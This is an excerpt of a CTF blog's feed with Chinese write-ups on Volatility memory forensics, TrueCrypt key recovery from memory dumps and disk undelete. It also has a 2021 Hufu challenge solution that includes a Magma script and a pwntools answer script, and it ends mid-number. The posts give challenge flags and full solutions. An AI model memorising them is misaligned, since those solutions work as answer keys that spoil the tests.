    <summary type="html">&lt;h3&gt;&lt;span id=&quot;2017年第三届美亚杯电子取证-个人赛&quot;&gt;2017年第三届美亚杯电子取证-个人赛&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;案件背景&quot;&gt;案件背景&lt;/span&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;Gary是一位经常用手提电脑的</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="取证" scheme="http://mklkx.github.io/tags/%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>内存取证和文件恢复常见操作</title>
    <link href="http://mklkx.github.io/2021/04/05/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%92%8C%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D%E5%B8%B8%E8%A7%81%E6%93%8D%E4%BD%9C/"/>
    <id>http://mklkx.github.io/2021/04/05/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%92%8C%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D%E5%B8%B8%E8%A7%81%E6%93%8D%E4%BD%9C/</id>
    <published>2021-04-05T12:48:45.000Z</published>
    <updated>2021-05-04T11:39:47.062Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="内存取证和文件恢复常见操作">内存取证和文件恢复常见操作</span></h1><hr><h2><span id="常用工具">常用工具</span></h2><ul><li>Volatility</li><li>Elcomsoft Forensic Disk Decryptor</li><li>EasyRecovery</li><li>MedAnalyze</li><li>FTK</li></ul><h2><span id="内存">内存</span></h2><ul><li>分析进程、内存数据</li><li>提取分析指定进程的特定内存数据</li></ul><h2><span id="vmdk">VMDK</span></h2><ul><li>本质上是物理硬盘的虚拟版，也会存在跟物理硬盘的分区和扇区类似的填充区域，可以利用这些填充区域把我们需要隐藏的数据进行处理，从而避免文件增加VMDK文件的大小，也可避免由于VMDK文件大小的改变所带来的可能导致虚拟机错误的问题。</li></ul><h2><span id="磁盘">磁盘</span></h2><p>常见的磁盘分区格式：</p><ul><li>Windows:FAT12-&gt;FAT16-&gt;FAT32-&gt;NTFS</li><li>Linux:EXT2-&gt;EXT3-&gt;EXT4</li></ul><h2><span id="以hdctf2019你能发现什么蛛丝马迹吗展开">以【[HDCTF2019]你能发现什么蛛丝马迹吗】展开</span></h2><h3><span id="查看系统版本">查看系统版本</span></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># volatility -f memory.img imageinfo</span><br></pre></td></tr></table></figure><p><img src="image1.png" alt="image1"></p><p>查看进程</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># volatility -f memory.img --profile&#x3D;Win2003SP0x86 pslist</span><br></pre></td></tr></table></figure><p><img src="image2.png" alt="image2"></p><p>针对Win2003SP0x86产生报错，故排除这个镜像</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># volatility -f memory.img --profile&#x3D;Win2003SP1x86 pslist</span><br></pre></td></tr></table></figure><p><img src="image3.png" alt="image3"></p><p>根据时间可以发现DumpIt.exe有东西</p><p>与该命令相似的为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># volatility -f memory.img --profile&#x3D;Win2003SP2x86 pstree</span><br></pre></td></tr></table></figure><p>不同点在于pstree顾名思义显示的是进程树，表明了各进程之间的从属关系。</p><p><img src="image4.png" alt="image4"></p><p>而</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># volatility -f memory.img --profile&#x3D;Win2003SP2x86 psscan</span><br></pre></td></tr></table></figure><p>则更加全面地进行了扫描，从而显示出被隐藏的进程，如病毒等</p><p><img src="image5.png" alt="image5"></p><h3><span id="将内存中的某个进程数据以-dmp-的格式保存出来">将内存中的某个进程数据以 dmp 的格式保存出来</span></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># volatility -f memory.img --profile&#x3D;Win2003SP2x86 memdump -p 1992 --dump-dir&#x3D;.&#x2F;</span><br></pre></td></tr></table></figure><h2><span id="以vampn2020-公开赛内存取证展开">以【[V&amp;N2020 公开赛]内存取证】展开</span></h2><p>通过上述内存取证起手式得到系统版本</p><p>查看进程</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 pslist</span><br></pre></td></tr></table></figure><p><img src="image6.png" alt="image6"></p><p>关注</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TrueCrypt.exe 3364</span><br><span class="line">notepad.exe 3552</span><br><span class="line">mspaint.exe 2648</span><br><span class="line"></span><br><span class="line">#volatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 memdump -p 3364 --dump-dir&#x3D;.&#x2F;</span><br><span class="line">#volatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 memdump -p 3552 --dump-dir&#x3D;.&#x2F;</span><br><span class="line">#volatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 memdump -p 2648 --dump-dir&#x3D;.&#x2F;</span><br></pre></td></tr></table></figure><p>依次处理</p><h3><span id="1notepadgteditbox">1）notepad=&gt;editbox</span></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 editbox</span><br></pre></td></tr></table></figure><p><img src="image7.png" alt="image7"></p><h3><span id="2mspaintgtgimp">2）mspaint=&gt;Gimp</span></h3><p><a href="https://www.gimp.org/downloads/">https://www.gimp.org/downloads/</a></p><p>不断调节位移、宽度和高度，</p><p><img src="image8.png" alt="image8"></p><p>出现【1YxFCQ6goYBF6Q】</p><h3><span id="3truecryptgtelcomsoft-forensic-disk-decryptor">3）TrueCrypt=&gt;Elcomsoft Forensic Disk Decryptor</span></h3><p>Decrypt or mount disk-&gt;TrueCrypt-&gt;select&amp;Memory dump&amp;Browse-&gt;mount</p><p><img src="image9.png" alt="image9"></p><p><img src="image10.png" alt="image10"></p><p>发现多了个F盘，其中存在key</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uOjFdKu1jsbWI8N51jsbWI8N5</span><br></pre></td></tr></table></figure><p>得到VOL的时候就该想到需要挂载，使用VeraCrypt,按之前学到的用法</p><p>此处注意需要勾选TrueCrypt</p><p><img src="image11.png" alt="image11"></p><p>得到fffflag.zip</p><h2><span id="以xman2018排位赛file展开">以【[XMAN2018排位赛]file】展开</span></h2><h3><span id="extundelete恢复原理">extundelete恢复原理：</span></h3><p>在linux下可以通过“ls -id”来查看某个文件或者目录的inode值，</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~&#x2F;桌面# ls -id &#x2F; </span><br><span class="line">2 &#x2F;</span><br></pre></td></tr></table></figure><p>从而得到桌面的innode值为2</p><p>而当使用extundelete来恢复文件时并不依赖特定的文件格式，</p><p>首先extundelete会通过文件的inode信息来获得当前文件系统下所有文件的信息，包括文件名和inode，包括已存在的和删除的文件。</p><p>再通过inode信息结合日志去查询该inode所在的block位置，包括直接块、间接块等信息。</p><p>最后利用dd命令将这些信息备份出来，从而恢复数据文件。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extundelete attachment.img --restore-all</span><br></pre></td></tr></table></figure><p><img src="image12.png" alt="image12"></p><h2><span id="以bsidessf2019diskimage展开">以【[BSidesSF2019]diskimage】展开</span></h2><p>前期通过zsteg分离出png中的数据后，利用testdisk进行分析。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">testdisk disk.dat</span><br></pre></td></tr></table></figure><p>一路回车</p><p><img src="image13.png" alt="image13"></p><p><img src="image14.png" alt="image14"></p><p><img src="image15.png" alt="image15"></p><p>选择最不同的那一个，根据提示进行copy，得到flag</p><p>关于testdisk的(中文版官方指南)[<a href="https://www.cgsecurity.org/wiki/Testdisk_%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97#.E9.97.AE.E9.A2.98.E4.B8.BE.E4.BE.8B">https://www.cgsecurity.org/wiki/Testdisk_操作指南#.E9.97.AE.E9.A2.98.E4.B8.BE.E4.BE.8B</a>]有更加深入的功能解说和详细用法</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;内存取证和文件恢复常见操作&quot;&gt;内存取证和文件恢复常见操作&lt;/span&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h2&gt;&lt;span id=&quot;常用工具&quot;&gt;常用工具&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Volatility&lt;/li&gt;
&lt;li&gt;Elcomsoft Fore</summary>
      
    
    
    
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
    <category term="取证" scheme="http://mklkx.github.io/tags/%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>虎符</title>
    <link href="http://mklkx.github.io/2021/04/03/%E8%99%8E%E7%AC%A6/"/>
    <id>http://mklkx.github.io/2021/04/03/%E8%99%8E%E7%AC%A6/</id>
    <published>2021-04-03T07:50:01.000Z</published>
    <updated>2021-05-08T10:36:21.558Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="2021数字中国创新大赛虎符网络安全赛道">2021数字中国创新大赛虎符网络安全赛道</span></h3><hr><h4><span id="你会日志分析吗">你会日志分析吗</span></h4><blockquote><p>线索只有一份access.log，你能从中分析到什么？</p></blockquote><p>观察到线索为盲注内容，</p><p>通过观察注入语句遍历库和表的过程，发现不同之处在于针对不同字符编码，返回的长度不同</p><p><img src="misc1.bmp" alt="misc1"></p><p>通过拼接得到</p><p><code>web1flllag,userflag ZmxhZ3tZb3VfYXJlX3NvX2dyZWF0eQ== #flag&#123;You_are_so_greaty</code></p><p>提交flag：</p><p><strong>flag{You_are_so_great}</strong></p><h4><span id="cubic">cubic</span></h4><blockquote><p>Please give me 6 pairs of positive integers (x,y,z) satisfying the equation x/(y+z) + y/(z+x) + z/(x+y) = 6 nc 8.140.152.226 27359</p></blockquote><p>根据https://mlzeng.com/an-interesting-equation.html理解算法意思。对等式进行化简后更改脚本，从而得到几组基底</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from fractions import Fraction as Frac</span><br><span class="line">from math import gcd</span><br><span class="line">#n &#x3D; 500</span><br><span class="line">for x in range(-100,100):</span><br><span class="line">    for y in range(-100,100):</span><br><span class="line">        for z in range(-100,100):</span><br><span class="line">            if gcd(x, gcd(y, z)) &#x3D;&#x3D; 1:</span><br><span class="line">                if x**3 + y**3 + z**3 - 5 * x**2 * (y + z) - 5 * y**2 * (z + x) - 5 * z**2 * (x + y) - 9 * x * y * z &#x3D;&#x3D; 0:</span><br><span class="line">                    print((x, y, z))</span><br><span class="line">#(-23, -7, 3)(-8, -7, 5)(-7, -23, 3)(-7, -8, 5)(-5, 7, 8)(-5, 8, 7)(-3, 7, 23)(-3, 23, 7)(-1, -1, 1)(-1, 0, 1)(-1, 1, 0)(-1, 1, 1)(0, -1, 1)(1, -1, 0)(1, -1, 1)(7, -5, 8)(7, -3, 23)(8, -5, 7)(23, -3, 7)</span><br></pre></td></tr></table></figure><p>去掉冗余后留下两组分别为(-23, -7, 3)(-8, -7, 5)找到文章https://www.quora.com/How-do-you-find-the-positive-integer-solutions-to-frac-x-y+z-±frac-y-z+x-±frac-z-x+y-4，根据评论得到解决类似问题x/(y+z) + y/(z+x) + z/(x+y) = 4，的脚本和网站http://magma.maths.usyd.edu.au/calc/针对本题目更改脚本</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; </span><br><span class="line">&#x2F;&#x2F; For my colleagues in Shell with a lot of love,  (and  with a lot of time now since no commuting, cause COVID) </span><br><span class="line">&#x2F;&#x2F; Code is commented to explain how to solve the meme  (https:&#x2F;&#x2F;preview.redd.it&#x2F;p92108lekoq11.jpg?width&#x3D;367&amp;format&#x3D;pjpg&amp;auto&#x3D;webp&amp;s&#x3D;e0c84917c3d7e130cad06f9ab5a85634b0c88cfb) </span><br><span class="line">&#x2F;&#x2F; </span><br><span class="line">&#x2F;&#x2F; x&#x2F;(y+z) + y&#x2F;(x+z) + z&#x2F;(x+y) &#x3D; 4 </span><br><span class="line">&#x2F;&#x2F; </span><br><span class="line">&#x2F;&#x2F; This is the smallest solution: </span><br><span class="line">&#x2F;&#x2F; x&#x3D;4373612677928697257861252602371390152816537558161613618621437993378423467772036 </span><br><span class="line">&#x2F;&#x2F; y&#x3D;36875131794129999827197811565225474825492979968971970996283137471637224634055579 </span><br><span class="line">&#x2F;&#x2F; z&#x3D;154476802108746166441951315019919837485664325669565431700026634898253202035277999 </span><br><span class="line">&#x2F;&#x2F; </span><br><span class="line">&#x2F;&#x2F; Paste in the site below to execute this code see this result, also read the comments here to understand.  </span><br><span class="line">&#x2F;&#x2F; The last part of the prints() after executed shows you the solution above. </span><br><span class="line">&#x2F;&#x2F; http:&#x2F;&#x2F;magma.maths.usyd.edu.au&#x2F;calc&#x2F; </span><br><span class="line">&#x2F;&#x2F; Eduardo Ruiz Duarte  </span><br><span class="line">&#x2F;&#x2F; toorandom@gmail.com </span><br><span class="line">&#x2F;&#x2F; </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; First we define our environment for our &quot;problem&quot; </span><br><span class="line"> </span><br><span class="line">R&lt;x,y,z&gt; :&#x3D; RationalFunctionField(Rationals(),3); </span><br><span class="line"> </span><br><span class="line">problem :&#x3D; ((x&#x2F;(y+z) + y&#x2F;(x+z) + z&#x2F;(x+y)) - 6) ; </span><br><span class="line"></span><br><span class="line">Evaluate(problem,[-23, -7, 3]); </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">problem*Denominator(problem); </span><br><span class="line"></span><br><span class="line">P2&lt;x,y,z&gt; :&#x3D; ProjectiveSpace(Rationals(),2); </span><br><span class="line">C :&#x3D; Curve(P2,x^3 - 5*x^2*y - 5*x^2*z - 5*x*y^2 - 9*x*y*z - 5*x*z^2 + y^3 - 5*y^2*z - 5*y*z^2 + z^3); </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Pt :&#x3D; C![-23, -7, 3]; </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">E,f :&#x3D; EllipticCurve(C); </span><br><span class="line"> </span><br><span class="line">g :&#x3D; f^-1; </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">for n:&#x3D; 1 to 100 do </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    nPt_inE:&#x3D;n*f(Pt); </span><br><span class="line"></span><br><span class="line">    nPt_inC:&#x3D;g(nPt_inE); </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    X :&#x3D; Numerator(nPt_inC[1]); </span><br><span class="line">    Y :&#x3D; Numerator(nPt_inC[2]); </span><br><span class="line">    Z :&#x3D; Denominator(nPt_inC[1]); </span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; printf &quot;X&#x3D;%o\nY&#x3D;%o\nZ&#x3D;%o\n&quot;,X,Y,Z; </span><br><span class="line"> </span><br><span class="line">  if ((X gt 0) and (Y gt 0)) then </span><br><span class="line">       printf &quot;Z&#x3D;%o\n&quot;,Z; </span><br><span class="line">        printf(&quot;GOT IT!!! x&#x3D;apple, y&#x3D;banana, z&#x3D;pineapple, check the above solution\n&quot;); </span><br><span class="line">        </span><br><span class="line">     &#x2F;&#x2F; break; </span><br><span class="line">  else </span><br><span class="line">      &#x2F;&#x2F; printf &quot;Nee, some coordinate was negative above, I keep in the loop\n\n&quot;; </span><br><span class="line">  end if; </span><br><span class="line"> </span><br><span class="line">end for;    </span><br><span class="line"></span><br><span class="line">if Evaluate(problem, [X,Y,Z]) eq 0 then </span><br><span class="line">    printf &quot;I evaluated the point to the original problem and yes, it worked!\n&quot;; </span><br><span class="line">else </span><br><span class="line">     printf &quot;Mmm this cannot happen!\n&quot;; </span><br><span class="line">end if;</span><br></pre></td></tr></table></figure><p>其次，有无网站对于输出有篇幅限制，想到可以通过逐次取出X,Y,Z来实现目的。</p><p>再者，由于问题要求输入六组正整数，同时不存在倍数等关联关系，便通过更改基底(-8, -7, 5)来实现。</p><p>从而得到了六组数据，进行数据处理后，手动输入时总有报错。最终想到交互脚本</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&quot;8.140.152.226&quot;,27359)</span><br><span class="line">print(p)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#39;[&gt;] x:&#39;,&#39;1218343242702905855792264237868803223073090298310121297526752830558323845503910071851999217959704024280699759290559009162035102974023&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] y:&#39;,&#39;2250324022012683866886426461942494811141200084921223218461967377588564477616220767789632257358521952443049813799712386367623925971447&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] z:&#39;,&#39;20260869859883222379931520298326390700152988332214525711323500132179943287700005601210288797153868533207131302477269470450828233936557&#39;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#39;[&gt;] x:&#39;,&#39;4797638216628812583434025577605647593302822112134074408304197287542626731655254754760070250069695806237478221185866750975864984886647923024950735389831823373908555291180424415780024231454429163667332563396190904475120830158622717917403410286269955215566928195911908452819781909832541473650205273220866668169706085422281346283683985976540910523295176188150172920324239409299506597321070979467526996274250455453182014342144936200082194972917287973666427586488695999171979538251246523201245515757129525859568862236578547077946470570834236704528174230986916804096494749486164989791799546021425641303587706015640912093764433943754791135952478302825539395135192814380102119660006534266801158156700532041924855632560802425763479310909232427688759422464721428542139255036982495633027474766492231096582800300651532249452886124953384853644678030788868746890039385094652563276776070355819550156592854511474008067006161138536377052747705010046805434254128197439636732559891068359224512685476617566910615703158046476554017740927198988625166011702932143115961764294294133907713303321841125624206851854472613188228173370133650483279735267719807509520708582676901775464380300759372054841808969769362891985102581373&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] y:&#39;,&#39;777215626371575217088310657140916521552988153647866038173198916020312203493964892557563515431776969976046377584808229726352107619185583316687354759898196737347993746254565122120527731768195400231056815663888758684421038238709788019326884485614991925753966183761708679471125148868876403664908848861229717592196841841920473123578320855383118815350240637368544307701771717790650586054632461552124823315180571553580552049469926518181331572822074022199558952119404190298735931653490892364073367374730596017190552617978971456481522903772154415790713998943890853561688541203855503519300220331450635692743853335580941406696263179637852488484574223656341703333725590156162934937022942328843104826018387806660541029784540066112095628410607646582758361692137157069659886753575805335098000015351084698040967634958962458780606944874861680995183423604699064295119192178585506522888929055816009012760980227645872065982724034169776145752311726352982276547920221698579169084852770861432795991389945366645278302963590215158406022987607104254724775954509771611804278473641470084216432339586431642635279556427721823661252622577913436058122095186869865354722446845980909445583248603818646384918432817277751662114543767&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] z:&#39;,&#39;45515177015370523186598470590800680389544668323346594120846310192651398948390333283841532838684228638057215529362980007901386037256606243099615016102478164356558671683211294326446538751067821841673990056500943490188667311094600394287944059737699170342758141308528120872594274846008499540806901157295755540786515739853811429101516388477908520360561007082314632823114318657321995023547907820030487984940570143033969059826198120222159054657757563990715876115982516007694588913589122694187210686371983934230131835116521724432838149089565766042842475792610165897246048263301498788205247949191959658551589000568833072395086346175560101459095869177540490444202757299358218286450933222931993542746092845434882841955167085611634798474215124723297956721787207069367210409930468551846723224409896901058733139606912810756783041961963236587262871957343659125846761987066927612211879278746707077150609197098785704768347642644777952301121081864034466935022811337948250337129064542497021903422439329618855883674545481251106939380976621498278402398166702566979987748149240552204768106633906852518721918670969297060120387704062182294525438430153827499412674831704727795905692842778950482616128311989966416414551687&#39;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#39;[&gt;] x:&#39;,&#39;314292671062173921111292961964938688436708560003041812060682883475601482731858816422240383882944462620623567286587503750889103725755740006155575297673642764299712726683321335389717791541964719934510825511641995918205107276454661741769794334108514203164641911236712095598112837257748637990075283636106682003276751427529201991787105193934697041232800134525851852447109810170418723631301828242625191639180887760900486283796646822636577982415485834912490056678350793904299469556675190381984269650656661389359603438215672023664789997298532577361391479552727060752508401019647303083662666278442587228978720394609332929193655411546120631186405265728554188782640067849098497720941130508081137596382759145482661677081314713162009647103220488302296025402048431671351592354184472261402188368030157633491138250760&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] y:&#39;,&#39;2370844050733763168653056912182275089135481091989469895123144001232602797883560999259129655883146226759407799774039653583687248933666821013837626069498685816554714705323847460507235277382794614936098961850448835901703891332533224965178208112684042141294337624561114056386810429548483148842597664557193452726536721058295707545479924443144714770275921157720051829171825732745857876583623371634787429544606363093272415125412836762819303421993587964400942215536942030583066797232871335393211395326041484926097986775013694902283133471846514714506451260645208477576233622738192899871671383782415144282058906877965816336875417759881658992236986398952428086504437441217917041059825839022060700048544901256390446316992733932612136873399094430223469630954259137165426566293784012450269989381719756996048058089023&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] z:&#39;,&#39;91799790641290895978892693045989377201208936340103016031364426490498736597677568287986160691579377724785392328266339231530225121046175630599728096521939605350739358168216330513241983978233993998988991326492874516049720675702286872816333914372511669802712219058719713832528597339293054368816739355907136102655521941992018553301928493452434474447723992660186680549103802498214282230740469986200770650120969911569599029786866103349814407040007149745644301920170584323025348517461308692357116926947251792699428368596979150563731309323515129474727817938633113832298119162778959620065753052386380251973187273607723986357950763286173562416762837143991547957533832926711542607034850457520418701875848727202883029106928219366050792422975016449024940528092641753838563742427509959090708910325398150439211810947&#39;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#39;[&gt;] x:&#39;,&#39;56343649470240944554541894194988032703152997483478025833485972092218241337348853462230550424269147587800007652800293442004563869063886539040704766619498961200516659583290762006742798747469819888357792304697529942283359016185536952419123443659813889544074213427237110287294366175059635489448606250819908358350367149475716496147487553433179157998593945045322448076446074865941920944926999884940332993017456395924976676018690218339595481948243896485907414278966492530683292887139539659213655023566766221831101135716001114169465582095106866429598465819579251295344339363122366559695834860866804821549078214470097325475562348355909825383578656299291495158122343583669460994581463652874145227290461773333377653825221448498643097415855394586840976390778065228010016838569596510884166894677724088453570554767891184009131202317463514667359675678308273163019864696397081276413389405178171832745064861375814617936899532879712697136502243767035869937886475349752732150896969705296958490386441876956461184753084885769489430408516478703269437168381789319788790797428959139328712339957316117433448921132629622916708162428803235294590729639690852735377737206875338559199642070756311221226354944275318104837238167938202874217277492682815157499036987671256790859209806061503081344974789146778142931461324438529830704647215310927456378226982094776791700899499767462440654000563331840801303630438288044726721668704136674569839611669539413577512641649460977325998156570611386695018346162124146444706600987125728699130857055733537679469412242428826826935313006521770416368190687794280098116223642593388696849325370974810173125463698206913626766831972902243040465791015306424858355284719345366417620405511681504199911683347113281944681912916616132595054141026620258530563782786876322816587301269197442746292368414303315916127317539282360592306966359033242684651591954067524673199807562267732882499063271347318982611006661263494424151752264285558404799539621054955240512368945118792096497578940815581860912677444713933006832661623582500082478103238386417759689596063674005645479325332513077947113142956489547967180110415807786757407565752981932876353479407753092629266170282399179455720412484028739177077916224898883055016568193570916954087403947022375704897561290704151306304296686231291915246078164894587604716731470270119255087638182016103482577417893994049532855443300933728751399104111113609139228244726117959809105870149939972243213243831080813292338018302734542541233393743764759099980125399064644064805556447102406684434751204627691119565714724372329434706830140754634784227958640480013090696910905948933204602786185318660439519844302686975950999911055368&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] y:&#39;,&#39;690513437917728358762742711882624210164156431191697460882071057631561434325917194724772571514769724756242649519293158098384452412034167432275066372007004613680327427275255271007127044500195055860576563483804846123615529706820098453919546485591052753586754752104074341574860615520024377668700069864523352595220021568265975747313365897344377455241983028423674873434480056500630547147021993841999914561066320454849616376511661854175124523626563946260328304964816820133526615504321061413552393435413734557860662179798338474456125557653019597413139361818201425365606459576981822303550670526711519547509422125776104848095712289913400348586094384034058327925810664271557067622049162165150997202607282520298373725742249437300215040007286145644594199573242191594020014861450701927255018742772391559888966053022348102555531053982964052676926034925187305081627180507684742157711204353955162518874918886441532355751364121120137220061598963972580632838065901252190541351505027162785606878378311773952864869040509371374045692153472360339820677197672974756063513992872813455047100440244265557323434292412653818727791484111886782630394009644619539997443752988480521672135682157981673252052742864017573864197821230865482608845995740938202946251972964115016855530942129284157345912242376589154358871801279188464112607201835735932165284481904436829641195268567905891766429473254156084489952125398195272913330657462922772676499577099055343169854441886913994787834086606951740959589308664147443162319475581543409481990727383462831564419330728082071773330584289890411190010801069814088316007675323856714135491996452097141166559416692817286741598938662142626353838913514868198944005794534159292904121493082022746192498136043686361054539803627017608616650817531026636848049654514828317231299512550948146410251443374282125060797517096613206515282939712390801471584022666792246977896986312650918250296670922360409243340310820180832046145279752237926888410158387477570151262836436709586347996373290744918424123874672100019158042610343734330300670999884700852984443231339851004224214797726388873060011777955177645327156497832413161629291650080831223335503202990794458074506899395173451753753412917542092805390442383785492313389266374623965592621164471788912979915288373531140420679741585514338378160814121102804719457924307258255604149561680677196943968021781539349025029439498318908711409131556014964860313682882585682350466634173408107287337651166402486894914050092552773350939774830857074355792728576489985768113131291720474480791442839751564508645608156726138081315247369269982278615147021753411529822207492155763831635572814845385765795018138222502796671315249755&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] z:&#39;,&#39;61848417055152133095432859376247872928009845246789580178050067454174942407289297559012928374669880399226235006088231916429036431717949140079523107699010796967464678696750432063224742137856002145403334654222909904962522076144363242043530182229726617880261101644639444540632138844359849325627444234093053497298089172796831309295203428323237607544929109304950196414277510671931861834789019508453957863965179460523547130977182721873412236354976041295946290574129654540505955820992215494161856824568912319386270787992756116866062781660041872686867599926093955236454271756037813904065345815807967197252149709256958910903921629063676085365164156292505994515780099836726603025001546701580563990270117723417757806315543027481605046648706694155341556749747961645150448309646644003429504745612139087577369112753968247750887383888853833638024926592320525431539002011906512566022225505488290067553775739475228974287524010911471199580446981297499033324293433054314997340507624763508479764288445959167109818379093312384897235514453806773570506136147460374739652208927635094780369233426741106222197305283621020742649692897738775130354778510804617375762614331484058562161679108584863456408377372390011016005774582862355690168291837260954433736953414457935193344330564117264151893117400699445297640650235267828893304134297349172279303352447772969171487962668842312818473409530277128527703784927802500713063308105794763395798900921132178185481565958439843343194891889939209386168195922077305571738816941145556666482431762119631038188209848264753064527691896274230406206976712407517112707473610456245413512449975006013001346800249527889328831154098431736999515648890302395574277947121160024065442038436332583230900633713649991890809933852937500538580995409391470251506811498781070869446698178060432825438142270059298820983291636082393750640274537182390720017567223171631951340485128381886918925746013563999355762098143500142836828449729756344834461718923526113135739367355419001961839441783370438433332524888952755072832867039562229899392173573353580606101453996017971785110492890103233518666006654441091010777306628401192942553802480194127241303493562250604973075784009007771841370274177808149418825652458156856491836062709242993030265020629565270893072372766252475123700999649400333603526094308829005361507091842135532356536463266979832102425199482313385944078782745555471266946905886911818229551468226593701687145021166521176732270133153258708133382809042442578592219243168751249134837347002782547031127475927820490325693389499997710379922677662230692761811590207110600097677071251835260867376130783566079991453152581322156882263817629990605055912556595367&#39;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#39;[&gt;] x:&#39;,&#39;146646276880372268782099023414615378933277671742657473515734272189417345731379394547099539794805335642740025579898682454914253373565324387293506566728347335764816154602136081339160640735842225848846317726719094779072088006793570227865290362942810103996761073873603276336053732598850331604699249781542014939244218545663921777385112653680030340470490635783273506946447688120416410100583135089973487657645565884207154086665849642952369405374174700327474542666091541087573291000969877002886306169235665015035927450241747014561602218736556834836618355528462200361704795367612325550387940866295885027791445581314245758091092906329196069243116497597324869790972762463017038509081825540697122736581358668985506242788290208740959019413358332513818280303187435372023952534125797699145329371623870260604990480997531118187384720217536057447396021063503068320334152437115827235954334276800268270464163927002310699552811596795461415826317660888923883441497915008571034555258286487527354839551176106310490167912662588477054013012711023925129954038215188958741863621740185627322340673677766473103569220840112954155462027653465893671897886790608366027388885247836065632642634852251605020432576587112792208191852435683956145254424042955767177186430092916162309969352581329916921653396616034605292999432717398425891466735810193062239730818348316985017883892449263918531515260990681495562557081189645500608981839084293733673358258726872251244351763495537375292250853370688455819702394131220782148416411631344904227517645091261026736773203632255587944830307857520578475145350232194689027876434953409083761479190783841929328709994386540654717051672674048944696472241001203655655596793207041651923914396654640402341671386545516192672276579336047187949650082850395848805125121072671369821403625272675288795781137970466303735685040016215131711375102845460254109078827160657270898400053908281563906483489876622426038536893012126446644583674748400813015600928888061045723762576404531754369030127490105845025465460226301752275453380857156115081494905690696134151199677993735488477232006582111495726936336827461129770862427151966085451244142688550989635023725180593997077825943088967857400660813675385984040414202634223168742790214431824338208442966789692318419325243088705659270244445402213740389348766976766566035100550495027413270429045594399884642723594614134716955380092791192435328639849637696856509963484433205637135522938457822180007616417062151272615713021435689957478975971809319513511808277484418028130749969564888708192631096307357040037300390636812673244045038095515011608723171814496433220783567422727800005675133744859956708944171893833528195874376548236511110059061903974223551104130026243295949878742452391851286905951070624019099648018346487996757210019819516746237695242214385331495517649976057468565636264291448217948602061395216981045657854270172642800535820180994386322587372912364331487850903547690056047325942598033552184157940006567182972227346733527930110907775362772342134762052859851623656474922294840661601333398191983091500345820077958654827433750354710221967691843944214425726357380727215520262300395631344123026808347598262462285954620950072190019205094431176542824086930878772617669292696602095691889500730309526078032224818016125739850298049022603359932076983347197258707346371333085127420456791576044457004633218307174689617329083331457141745363161704965427690311501014503025866416394535945400894457566904192281692552598939034527090754473778126886227000285981642466330632764421307145091762402876063936843951003939117932240873378609447487354157106869009347980334147974645897245994451828970504494342968719901513165964242470458526848323478427720035056494483550224969693407861405114076315304727508615307713383138667926034385920246454225414539351903248112550903306696840275247650685928388679795698943240065452725472480453915101700437898922709154867127665010913208289229347323943987328821061600471813720200152278241578767060747717298077664197537690782481374075390085888116307300997367549741132747575948466199443354102711847847787320380128534852079463332859265726350599999